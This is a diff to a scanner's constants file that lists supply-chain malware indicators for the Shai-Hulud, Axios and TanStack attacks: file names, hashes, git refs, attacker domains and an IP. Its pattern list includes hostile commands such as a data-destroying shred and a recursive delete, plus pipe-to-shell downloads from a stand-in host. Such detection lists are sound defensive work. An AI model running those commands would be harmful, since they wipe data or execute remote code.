@@ -8,16 +8,10 @@
 
 export const MALWARE_FILENAMES = ["setup_bun.js","bun_environment.js","shai-hulud.js","worm.js","setup.js","com.apple.act.mond","ld.py","6202033.ps1","6202033.vbs","router_init.js","tanstack_runner.js","router_runtime.js","gh-token-monitor.sh","gh-token-monitor.service","com.user.gh-token-monitor.plist"];
 export const MALWARE_PATTERNS = ["Shai-Hulud","The Second Coming","shred -uvz -n 1","del /F /Q /S \"%USERPROFILE%*\"","irm bun.sh/install.ps1|iex","curl -sL http://malicious.com | bash","node setup_bun.js","plain-crypto-js","sfrclak.com","calltan.com","callnrwise.com","OrDeR_7077","142.11.206.73","node setup.js","com.apple.act.mond","packages.npm.org/product","mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)","EveryBoiWeBuildIsAWormyBoi","IfYouRevokeThisTokenItWillWipeTheComputerOfTheOwner","OhNoWhatsGoingOnWithGitHub","svksjrhjkcejg","0c0e873033875f1bc471eda37e3b9d0f9b89bd41a4bbb4f86746caa2186c40aa","bun run tanstack_runner.js","tanstack_runner.js","router_init.js","79ac49eedf774dd4b0cfa308722bc463cfe5885c","github:tanstack/router#79ac49eedf","filev2.getsession.org","api.masscan.cloud","git-tanstack.com","litter.catbox.moe/h8nc9u.js","litter.catbox.moe/7rrc6l.mjs","__DAEMONIZED","dependabout/","claude@users.noreply.github.com"];
+export const KNOWN_BAD_GIT_REFS = ["79ac49eedf774dd4b0cfa308722bc463cfe5885c","79ac49eedf"];
 
 // Axios attack stage-2 payload hashes (SHA-256)
-export const AXIOS_MALWARE_HASHES = new Set([
-  '92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a',
-  '617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101',
-  'fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf',
-]);
+export const AXIOS_MALWARE_HASHES = new Set(["92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a","617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101","fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf"]);
 
 // TanStack wave 4 payload hashes (SHA-256) - GHSA-g7cv-rxg3-hmpx
-export const TANSTACK_MALWARE_HASHES = new Set([
-  'ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c',
-  '2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96',
-]);
+export const TANSTACK_MALWARE_HASHES = new Set(["ab4fcadaec49c03278063dd269ea5eef82d24f2124a8e15d7b90f2fa8601266c","2ec78d556d696e208927cc503d48e4b5eb56b31abc2870c2ed2e98d6be27fc96"]);
